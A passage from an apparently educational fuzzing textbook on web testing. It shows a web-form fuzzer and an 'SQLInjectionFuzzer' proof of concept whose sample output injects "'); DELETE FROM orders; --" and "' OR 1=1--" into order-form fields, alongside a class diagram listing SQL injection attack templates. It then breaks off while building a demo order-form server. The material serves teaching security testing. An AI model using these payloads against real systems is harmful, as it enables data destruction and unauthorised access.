<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">web_form_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;/order?item=lockset&amp;name=%43+&amp;email=+c%40_+c&amp;city=%37b_4&amp;zip=5&amp;terms=on&amp;submit=&#39;
</pre></div>
</div>
</div>
</div>
<p>Repeated calls to <code class="docutils literal notranslate"><span class="pre">WebFormFuzzer.fuzz()</span></code> invoke the form again and again, each time with different (fuzzed) values.</p>
<p>Internally, <code class="docutils literal notranslate"><span class="pre">WebFormFuzzer</span></code> builds on a helper class named <code class="docutils literal notranslate"><span class="pre">HTMLGrammarMiner</span></code>; you can extend its functionality to include more features.</p>
</section>
<section id="sql-injection-attacks">
<h3>SQL Injection Attacks<a class="headerlink" href="#sql-injection-attacks" title="Link to this heading">#</a></h3>
<p><code class="docutils literal notranslate"><span class="pre">SQLInjectionFuzzer</span></code> is an experimental extension of <code class="docutils literal notranslate"><span class="pre">WebFormFuzzer</span></code> whose constructor takes an additional <em>payload</em> – an SQL command to be injected and executed on the server.  Otherwise, it is used like <code class="docutils literal notranslate"><span class="pre">WebFormFuzzer</span></code>:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">sql_fuzzer</span> <span class="o">=</span> <span class="n">SQLInjectionFuzzer</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="s2">&quot;DELETE FROM orders&quot;</span><span class="p">)</span>
<span class="n">sql_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&quot;/order?item=lockset&amp;name=+&amp;email=0%404&amp;city=+&#39;+)%3b+DELETE+FROM+orders%3b+--&amp;zip=&#39;+OR+1%3d1--&#39;&amp;terms=on&amp;submit=&quot;
</pre></div>
</div>
</div>
</div>
<p>As you can see, the path to be retrieved contains the payload encoded into one of the form field values.</p>
<p>Internally, <code class="docutils literal notranslate"><span class="pre">SQLInjectionFuzzer</span></code> builds on a helper class named <code class="docutils literal notranslate"><span class="pre">SQLInjectionGrammarMiner</span></code>; you can extend its functionality to include more features.</p>
<p><code class="docutils literal notranslate"><span class="pre">SQLInjectionFuzzer</span></code> is a proof-of-concept on how to build a malicious fuzzer; you should study and extend its code to make actual use of it.</p>
<div class="cell tag_remove-input docutils container">
</div>
<div class="cell tag_remove-input docutils container">
<div class="cell_output docutils container">
<div class="output text_html"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
 "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!-- Generated by graphviz version 13.1.2 (20250808.2320)
 -->
<!-- Pages: 1 -->
<svg width="594pt" height="451pt"
 viewBox="0.00 0.00 594.00 451.00" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="graph0" class="graph" transform="scale(1 1) rotate(0) translate(4 446.5)">
<g id="a_graph0"><a xlink:title="WebFormFuzzer class hierarchy">
<polygon fill="white" stroke="none" points="-4,4 -4,-446.5 589.88,-446.5 589.88,4 -4,4"/>
</a>
</g>
<!-- WebFormFuzzer -->
<g id="node1" class="node">
<title>WebFormFuzzer</title>
<g id="a_node1"><a xlink:href="#" xlink:title="class WebFormFuzzer:&#10;A Fuzzer for Web forms">
<polygon fill="none" stroke="black" points="9,-121.75 9,-194 125.5,-194 125.5,-121.75 9,-121.75"/>
<text xml:space="preserve" text-anchor="start" x="17" y="-177.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">WebFormFuzzer</text>
<polyline fill="none" stroke="black" points="9,-168 125.5,-168"/>
<g id="a_node1_0"><a xlink:href="#" xlink:title="WebFormFuzzer">
<g id="a_node1_1"><a xlink:href="#" xlink:title="__init__(self, url: str, *, grammar_miner_class: Optional[type] = None, **grammar_fuzzer_options):&#10;Constructor.&#10;`url` &#45; the URL of the Web form to fuzz.&#10;`grammar_miner_class` &#45; the class of the grammar miner&#10;to use (default: `HTMLGrammarMiner`)&#10;Other keyword arguments are passed to the `GrammarFuzzer` constructor">
<text xml:space="preserve" text-anchor="start" x="28.25" y="-155.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text>
</a>
</g>
<g id="a_node1_2"><a xlink:href="#" xlink:title="get_grammar(self, html_text: str):&#10;Obtain the grammar for the given HTML `html_text`.&#10;To be overloaded in subclasses.">
<text xml:space="preserve" text-anchor="start" x="28.25" y="-142.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-style="italic" font-size="10.00">get_grammar()</text>
</a>
</g>
<g id="a_node1_3"><a xlink:href="#" xlink:title="get_html(self, url: str):&#10;Retrieve the HTML text for the given URL `url`.&#10;To be overloaded in subclasses.">
<text xml:space="preserve" text-anchor="start" x="28.25" y="-130" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-style="italic" font-size="10.00">get_html()</text>
</a>
</g>
</a>
</g>
</a>
</g>
</g>
<!-- GrammarFuzzer -->
<g id="node2" class="node">
<title>GrammarFuzzer</title>
<g id="a_node2"><a xlink:href="GrammarFuzzer.ipynb" xlink:title="class GrammarFuzzer:&#10;Produce strings from grammars efficiently, using derivation trees.">
<polygon fill="none" stroke="black" points="9.38,-247.75 9.38,-320 125.12,-320 125.12,-247.75 9.38,-247.75"/>
<text xml:space="preserve" text-anchor="start" x="17.38" y="-303.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">GrammarFuzzer</text>
<polyline fill="none" stroke="black" points="9.38,-294 125.12,-294"/>
<g id="a_node2_4"><a xlink:href="#" xlink:title="GrammarFuzzer">
<g id="a_node2_5"><a xlink:href="GrammarFuzzer.ipynb" xlink:title="__init__(self, grammar: Dict[str, List[Expansion]], start_symbol: str = &#39;&lt;start&gt;&#39;, min_nonterminals: int = 0, max_nonterminals: int = 10, disp: bool = False, log: Union[bool, int] = False) &#45;&gt; None:&#10;Produce strings from `grammar`, starting with `start_symbol`.&#10;If `min_nonterminals` or `max_nonterminals` is given, use them as limits&#10;for the number of nonterminals produced.&#10;If `disp` is set, display the intermediate derivation trees.&#10;If `log` is set, show intermediate steps as text on standard output.">
<text xml:space="preserve" text-anchor="start" x="34.25" y="-281.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text>
</a>
</g>
<g id="a_node2_6"><a xlink:href="GrammarFuzzer.ipynb" xlink:title="fuzz(self) &#45;&gt; str:&#10;Produce a string from the grammar.">
<text xml:space="preserve" text-anchor="start" x="34.25" y="-268.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">fuzz()</text>
</a>
</g>
<g id="a_node2_7"><a xlink:href="GrammarFuzzer.ipynb" xlink:title="fuzz_tree(self) &#45;&gt; DerivationTree:&#10;Produce a derivation tree from the grammar.">
<text xml:space="preserve" text-anchor="start" x="34.25" y="-256" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="10.00">fuzz_tree()</text>
</a>
</g>
</a>
</g>
</a>
</g>
</g>
<!-- WebFormFuzzer&#45;&gt;GrammarFuzzer -->
<g id="edge1" class="edge">
<title>WebFormFuzzer&#45;&gt;GrammarFuzzer</title>
<path fill="none" stroke="black" d="M67.25,-194.41C67.25,-207.38 67.25,-222.25 67.25,-236.06"/>
<polygon fill="none" stroke="black" points="63.75,-235.82 67.25,-245.82 70.75,-235.82 63.75,-235.82"/>
</g>
<!-- Fuzzer -->
<g id="node3" class="node">
<title>Fuzzer</title>
<g id="a_node3"><a xlink:href="Fuzzer.ipynb" xlink:title="class Fuzzer:&#10;Base class for fuzzers.">
<polygon fill="none" stroke="black" points="29.25,-357 29.25,-442 105.25,-442 105.25,-357 29.25,-357"/>
<text xml:space="preserve" text-anchor="start" x="46.62" y="-425.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">Fuzzer</text>
<polyline fill="none" stroke="black" points="29.25,-416 105.25,-416"/>
<g id="a_node3_8"><a xlink:href="#" xlink:title="Fuzzer">
<g id="a_node3_9"><a xlink:href="Fuzzer.ipynb" xlink:title="__init__(self) &#45;&gt; None:&#10;Constructor">
<text xml:space="preserve" text-anchor="start" x="37.25" y="-403.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text>
</a>
</g>
<g id="a_node3_10"><a xlink:href="Fuzzer.ipynb" xlink:title="fuzz(self) &#45;&gt; str:&#10;Return fuzz input">
<text xml:space="preserve" text-anchor="start" x="37.25" y="-390.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">fuzz()</text>
</a>
</g>
<g id="a_node3_11"><a xlink:href="Fuzzer.ipynb" xlink:title="run(self, runner: Fuzzer.Runner = &lt;Fuzzer.Runner object at 0x10bdae3c0&gt;) &#45;&gt; Tuple[subprocess.CompletedProcess, str]:&#10;Run `runner` with fuzz input">
<text xml:space="preserve" text-anchor="start" x="37.25" y="-378" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="10.00">run()</text>
</a>
</g>
<g id="a_node3_12"><a xlink:href="Fuzzer.ipynb" xlink:title="runs(self, runner: Fuzzer.Runner = &lt;Fuzzer.PrintRunner object at 0x10bdae510&gt;, trials: int = 10) &#45;&gt; List[Tuple[subprocess.CompletedProcess, str]]:&#10;Run `runner` with fuzz input, `trials` times">
<text xml:space="preserve" text-anchor="start" x="37.25" y="-365.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="10.00">runs()</text>
</a>
</g>
</a>
</g>
</a>
</g>
</g>
<!-- GrammarFuzzer&#45;&gt;Fuzzer -->
<g id="edge2" class="edge">
<title>GrammarFuzzer&#45;&gt;Fuzzer</title>
<path fill="none" stroke="black" d="M67.25,-320.2C67.25,-328.18 67.25,-336.81 67.25,-345.33"/>
<polygon fill="none" stroke="black" points="63.75,-345.3 67.25,-355.3 70.75,-345.3 63.75,-345.3"/>
</g>
<!-- SQLInjectionFuzzer -->
<g id="node4" class="node">
<title>SQLInjectionFuzzer</title>
<g id="a_node4"><a xlink:href="#" xlink:title="class SQLInjectionFuzzer:&#10;Simple demonstrator of a SQL Injection Fuzzer">
<polygon fill="none" stroke="black" points="0,-4.5 0,-64 134.5,-64 134.5,-4.5 0,-4.5"/>
<text xml:space="preserve" text-anchor="start" x="8" y="-47.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">SQLInjectionFuzzer</text>
<polyline fill="none" stroke="black" points="0,-38 134.5,-38"/>
<g id="a_node4_13"><a xlink:href="#" xlink:title="SQLInjectionFuzzer">
<g id="a_node4_14"><a xlink:href="#" xlink:title="__init__(self, url: str, sql_payload: str = &#39;&#39;, *, sql_injection_grammar_miner_class: Optional[type] = None, **kwargs):&#10;Constructor.&#10;`url` &#45; the Web page (with a form) to retrieve&#10;`sql_payload` &#45; the SQL command to execute&#10;`sql_injection_grammar_miner_class` &#45; the miner to be used&#10;(default: SQLInjectionGrammarMiner)&#10;Other keyword arguments are passed to `WebFormFuzzer`.">
<text xml:space="preserve" text-anchor="start" x="28.25" y="-25.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text>
</a>
</g>
<g id="a_node4_15"><a xlink:href="#" xlink:title="get_grammar(self, html_text):&#10;Obtain a grammar with SQL injection commands">
<text xml:space="preserve" text-anchor="start" x="28.25" y="-12.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-style="italic" font-size="10.00">get_grammar()</text>
</a>
</g>
</a>
</g>
</a>
</g>
</g>
<!-- SQLInjectionFuzzer&#45;&gt;WebFormFuzzer -->
<g id="edge3" class="edge">
<title>SQLInjectionFuzzer&#45;&gt;WebFormFuzzer</title>
<path fill="none" stroke="black" d="M67.25,-64.38C67.25,-78.05 67.25,-94.67 67.25,-110.04"/>
<polygon fill="none" stroke="black" points="63.75,-109.96 67.25,-119.96 70.75,-109.96 63.75,-109.96"/>
</g>
<!-- WebRunner -->
<g id="node5" class="node">
<title>WebRunner</title>
<g id="a_node5"><a xlink:href="#" xlink:title="class WebRunner:&#10;Runner for a Web server">
<polygon fill="none" stroke="black" points="152.5,-4.5 152.5,-64 242,-64 242,-4.5 152.5,-4.5"/>
<text xml:space="preserve" text-anchor="start" x="160.5" y="-47.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">WebRunner</text>
<polyline fill="none" stroke="black" points="152.5,-38 242,-38"/>
<g id="a_node5_16"><a xlink:href="#" xlink:title="WebRunner">
<g id="a_node5_17"><a xlink:href="#" xlink:title="__init__(self, base_url: Optional[str] = None):&#10;Initialize">
<text xml:space="preserve" text-anchor="start" x="167.25" y="-25.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text>
</a>
</g>
<g id="a_node5_18"><a xlink:href="#" xlink:title="run(self, url: str) &#45;&gt; Tuple[str, str]:&#10;Run the runner with the given input">
<text xml:space="preserve" text-anchor="start" x="167.25" y="-12.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">run()</text>
</a>
</g>
</a>
</g>
</a>
</g>
</g>
<!-- Runner -->
<g id="node6" class="node">
<title>Runner</title>
<g id="a_node6"><a xlink:href="Fuzzer.ipynb" xlink:title="class Runner:&#10;Base class for testing inputs.">
<polygon fill="none" stroke="black" points="159.25,-105 159.25,-210.75 235.25,-210.75 235.25,-105 159.25,-105"/>
<text xml:space="preserve" text-anchor="start" x="174.38" y="-194.45" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">Runner</text>
<polyline fill="none" stroke="black" points="159.25,-184.75 235.25,-184.75"/>
<g id="a_node6_19"><a xlink:href="#" xlink:title="Runner">
<g id="a_node6_20"><a xlink:href="Fuzzer.ipynb" xlink:title="FAIL = &#39;FAIL&#39;">
<text xml:space="preserve" text-anchor="start" x="167.25" y="-171.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">FAIL</text>
</a>
</g>
<g id="a_node6_21"><a xlink:href="Fuzzer.ipynb" xlink:title="PASS = &#39;PASS&#39;">
<text xml:space="preserve" text-anchor="start" x="167.25" y="-158.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">PASS</text>
</a>
</g>
<g id="a_node6_22"><a xlink:href="Fuzzer.ipynb" xlink:title="UNRESOLVED = &#39;UNRESOLVED&#39;">
<text xml:space="preserve" text-anchor="start" x="167.25" y="-145.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">UNRESOLVED</text>
</a>
</g>
</a>
</g>
<polyline fill="none" stroke="black" points="159.25,-138.5 235.25,-138.5"/>
<g id="a_node6_23"><a xlink:href="#" xlink:title="Runner">
<g id="a_node6_24"><a xlink:href="Fuzzer.ipynb" xlink:title="__init__(self) &#45;&gt; None:&#10;Initialize">
<text xml:space="preserve" text-anchor="start" x="167.25" y="-126" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text>
</a>
</g>
<g id="a_node6_25"><a xlink:href="Fuzzer.ipynb" xlink:title="run(self, inp: str) &#45;&gt; Any:&#10;Run the runner with the given input">
<text xml:space="preserve" text-anchor="start" x="167.25" y="-113.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">run()</text>
</a>
</g>
</a>
</g>
</a>
</g>
</g>
<!-- WebRunner&#45;&gt;Runner -->
<g id="edge4" class="edge">
<title>WebRunner&#45;&gt;Runner</title>
<path fill="none" stroke="black" d="M197.25,-64.38C197.25,-73.16 197.25,-83.17 197.25,-93.28"/>
<polygon fill="none" stroke="black" points="193.75,-93.16 197.25,-103.16 200.75,-93.16 193.75,-93.16"/>
</g>
<!-- HTMLGrammarMiner -->
<g id="node7" class="node">
<title>HTMLGrammarMiner</title>
<g id="a_node7"><a xlink:href="#" xlink:title="class HTMLGrammarMiner:&#10;Mine a grammar from a HTML form">
<polygon fill="none" stroke="black" points="279.88,-117.75 279.88,-198 428.62,-198 428.62,-117.75 279.88,-117.75"/>
<text xml:space="preserve" text-anchor="start" x="287.88" y="-181.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">HTMLGrammarMiner</text>
<polyline fill="none" stroke="black" points="279.88,-172 428.62,-172"/>
<g id="a_node7_26"><a xlink:href="#" xlink:title="HTMLGrammarMiner">
<g id="a_node7_27"><a xlink:href="#" xlink:title="QUERY_GRAMMAR = {&#39;&lt;start&gt;&#39;: [&#39;&lt;action&gt;?&lt;query&gt;&#39;], &#39;&lt;string&gt;&#39;: [&#39;&lt;letter&gt;&#39;, &#39;&lt;letter&gt;&lt;string&gt;&#39;], &#39;&lt;letter&gt;&#39;: [&#39;&lt;plus&gt;&#39;, &#39;&lt;percent&gt;&#39;, &#39;&lt;other&gt;&#39;], &#39;&lt;plus&gt;&#39;: [&#39;+&#39;], &#39;&lt;percent&gt;&#39;: [&#39;%&lt;hexdigit&#45;1&gt;&lt;hexdigit&gt;&#39;], &#39;&lt;hexdigit&gt;&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;], &#39;&lt;other&gt;&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;&#45;&#39;, &#39;_&#39;], &#39;&lt;text&gt;&#39;: [&#39;&lt;string&gt;&#39;], &#39;&lt;number&gt;&#39;: [&#39;&lt;digits&gt;&#39;], &#39;&lt;digits&gt;&#39;: [&#39;&lt;digit&gt;&#39;, &#39;&lt;digits&gt;&lt;digit&gt;&#39;], &#39;&lt;digit&gt;&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;], &#39;&lt;checkbox&gt;&#39;: [&#39;&lt;_checkbox&gt;&#39;], &#39;&lt;_checkbox&gt;&#39;: [&#39;on&#39;, &#39;off&#39;], &#39;&lt;email&gt;&#39;: [&#39;&lt;_email&gt;&#39;], &#39;&lt;_email&gt;&#39;: [&#39;&lt;string&gt;%40&lt;string&gt;&#39;], &#39;&lt;password&gt;&#39;: [&#39;&lt;_password&gt;&#39;], &#39;&lt;_password&gt;&#39;: [&#39;abcABC.123&#39;], &#39;&lt;hexdigit&#45;1&gt;&#39;: [&#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;], &#39;&lt;submit&gt;&#39;: [&#39;&#39;]}">
<text xml:space="preserve" text-anchor="start" x="315.25" y="-158.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">QUERY_GRAMMAR</text>
</a>
</g>
</a>
</g>
<polyline fill="none" stroke="black" points="279.88,-151.25 428.62,-151.25"/>
<g id="a_node7_28"><a xlink:href="#" xlink:title="HTMLGrammarMiner">
<g id="a_node7_29"><a xlink:href="#" xlink:title="__init__(self, html_text: str) &#45;&gt; None:&#10;Constructor. `html_text` is the HTML string to parse.">
<text xml:space="preserve" text-anchor="start" x="312.25" y="-138.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="10.00">__init__()</text>
</a>
</g>
<g id="a_node7_30"><a xlink:href="#" xlink:title="mine_grammar(self) &#45;&gt; Dict[str, List[Expansion]]:&#10;Extract a grammar from the given HTML text">
<text xml:space="preserve" text-anchor="start" x="312.25" y="-125" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">mine_grammar()</text>
</a>
</g>
</a>
</g>
</a>
</g>
</g>
<!-- SQLInjectionGrammarMiner -->
<g id="node8" class="node">
<title>SQLInjectionGrammarMiner</title>
<g id="a_node8"><a xlink:href="#" xlink:title="class SQLInjectionGrammarMiner:&#10;Demonstration of an automatic SQL Injection attack grammar miner">
<polygon fill="none" stroke="black" points="260,-0.5 260,-68 448.5,-68 448.5,-0.5 260,-0.5"/>
<text xml:space="preserve" text-anchor="start" x="268" y="-51.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">SQLInjectionGrammarMiner</text>
<polyline fill="none" stroke="black" points="260,-42 448.5,-42"/>
<g id="a_node8_31"><a xlink:href="#" xlink:title="SQLInjectionGrammarMiner">
<g id="a_node8_32"><a xlink:href="#" xlink:title="ATTACKS = [&quot;&lt;string&gt;&#39; &lt;sql&#45;values&gt;); &lt;sql&#45;payload&gt;; &lt;sql&#45;comment&gt;&quot;, &quot;&lt;string&gt;&#39; &lt;sql&#45;comment&gt;&quot;, &quot;&#39; OR 1=1&lt;sql&#45;comment&gt;&#39;&quot;, &#39;&lt;number&gt; OR 1=1&#39;]">
<text xml:space="preserve" text-anchor="start" x="333.25" y="-28.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">ATTACKS</text>
</a>
</g>
</a>
</g>
<polyline fill="none" stroke="black" points="260,-21.25 448.5,-21.25"/>
<g id="a_node8_33"><a xlink:href="#" xlink:title="SQLInjectionGrammarMiner">
<g id="a_node8_34"><a xlink:href="#" xlink:title="__init__(self, html_text: str, sql_payload: str):&#10;Constructor.&#10;`html_text` &#45; the HTML form to be attacked&#10;`sql_payload` &#45; the SQL command to be executed">
<text xml:space="preserve" text-anchor="start" x="324.25" y="-8.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text>
</a>
</g>
</a>
</g>
</a>
</g>
</g>
<!-- SQLInjectionGrammarMiner&#45;&gt;HTMLGrammarMiner -->
<g id="edge5" class="edge">
<title>SQLInjectionGrammarMiner&#45;&gt;HTMLGrammarMiner</title>
<path fill="none" stroke="black" d="M354.25,-68.48C354.25,-80.12 354.25,-93.46 354.25,-106.19"/>
<polygon fill="none" stroke="black" points="350.75,-106.13 354.25,-116.13 357.75,-106.13 350.75,-106.13"/>
</g>
<!-- Legend -->
<g id="node9" class="node">
<title>Legend</title>
<text xml:space="preserve" text-anchor="start" x="466.62" y="-50.25" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="10.00" fill="#b03a2e">Legend</text>
<text xml:space="preserve" text-anchor="start" x="466.62" y="-40.25" font-family="Patua One, Helvetica, sans-serif" font-size="10.00">• </text>
<text xml:space="preserve" text-anchor="start" x="472.62" y="-40.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="8.00">public_method()</text>
<text xml:space="preserve" text-anchor="start" x="466.62" y="-30.25" font-family="Patua One, Helvetica, sans-serif" font-size="10.00">• </text>
<text xml:space="preserve" text-anchor="start" x="472.62" y="-30.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="8.00">private_method()</text>
<text xml:space="preserve" text-anchor="start" x="466.62" y="-20.25" font-family="Patua One, Helvetica, sans-serif" font-size="10.00">• </text>
<text xml:space="preserve" text-anchor="start" x="472.62" y="-20.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-style="italic" font-size="8.00">overloaded_method()</text>
<text xml:space="preserve" text-anchor="start" x="466.62" y="-11.2" font-family="Helvetica,sans-Serif" font-size="9.00">Hover over names to see doc</text>
</g>
</g>
</svg>
</div></div>
</div>
</section>
</section>
<section id="a-web-user-interface">
<h2>A Web User Interface<a class="headerlink" href="#a-web-user-interface" title="Link to this heading">#</a></h2>
<p>Let us start with a simple example.  We want to set up a <em>Web server</em> that allows readers of this book to buy fuzzingbook-branded fan articles (“swag”).  In reality, we would make use of an existing Web shop (or an appropriate framework) for this purpose.  For the purpose of this book, we <em>write our own Web server</em>, building on the HTTP server facilities provided by the Python library.</p>
<section id="excursion-implementing-a-web-server">
<h3>Excursion: Implementing a Web Server<a class="headerlink" href="#excursion-implementing-a-web-server" title="Link to this heading">#</a></h3>
<p>All of our Web server is defined in a <code class="docutils literal notranslate"><span class="pre">HTTPRequestHandler</span></code>, which, as the name suggests, handles arbitrary Web page requests.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">http.server</span><span class="w"> </span><span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">http.server</span><span class="w"> </span><span class="kn">import</span> <span class="n">HTTPStatus</span>  <span class="c1"># type: ignore</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;A simple HTTP server&quot;&quot;&quot;</span>
    <span class="k">pass</span>
</pre></div>
</div>
</div>
</div>
<section id="taking-orders">
<h4>Taking Orders<a class="headerlink" href="#taking-orders" title="Link to this heading">#</a></h4>
<p>For our Web server, we need a number of Web pages:</p>
<ul class="simple">
<li><p>We want one page where customers can place an order.</p></li>
<li><p>We want one page where they see their order confirmed.</p></li>
<li><p>Additionally, we need pages display error messages such as “Page Not Found”.</p></li>
</ul>
<p>We start with the order form.  The dictionary <code class="docutils literal notranslate"><span class="pre">FUZZINGBOOK_SWAG</span></code> holds the items that customers can order, together with long descriptions:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">bookutils.setup</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">NoReturn</span><span class="p">,</span> <span class="n">Tuple</span><span class="p">,</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">List</span><span class="p">,</span> <span class="n">Optional</span><span class="p">,</span> <span class="n">Union</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">FUZZINGBOOK_SWAG</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;tshirt&quot;</span><span class="p">:</span> <span class="s2">&quot;One FuzzingBook T-Shirt&quot;</span><span class="p">,</span>
    <span class="s2">&quot;drill&quot;</span><span class="p">:</span> <span class="s2">&quot;One FuzzingBook Rotary Hammer&quot;</span><span class="p">,</span>
    <span class="s2">&quot;lockset&quot;</span><span class="p">:</span> <span class="s2">&quot;One FuzzingBook Lock Set&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
</div>
<p>This is the HTML code for the order form.  The menu for selecting the swag to be ordered is created dynamically from <code class="docutils literal notranslate"><span class="pre">FUZZINGBOOK_SWAG</span></code>.  We omit plenty of details such as precise shipping address, payment, shopping cart, and more.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML_ORDER_FORM</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;&lt;body&gt;</span>
<span class="s2">&lt;form action=&quot;/order&quot; style=&quot;border:3px; border-style:solid; border-color:#FF0000; padding: 1em;&quot;&gt;</span>
<span class="s2">  &lt;strong id=&quot;title&quot; style=&quot;font-size: x-large&quot;&gt;Fuzzingbook Swag Order Form&lt;/strong&gt;</span>
<span class="s2">  &lt;p&gt;</span>
<span class="s2">  Yes! Please send me at your earliest convenience</span>
<span class="s2">  &lt;select name=&quot;item&quot;&gt;</span>
<span class="s2">  &quot;&quot;&quot;</span>
<span class="c1"># (We don&#39;t use h2, h3, etc. here</span>
<span class="c1"># as they interfere with the notebook table of contents)</span>


<span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">FUZZINGBOOK_SWAG</span><span class="p">:</span>
    <span class="n">HTML_ORDER_FORM</span> <span class="o">+=</span> \
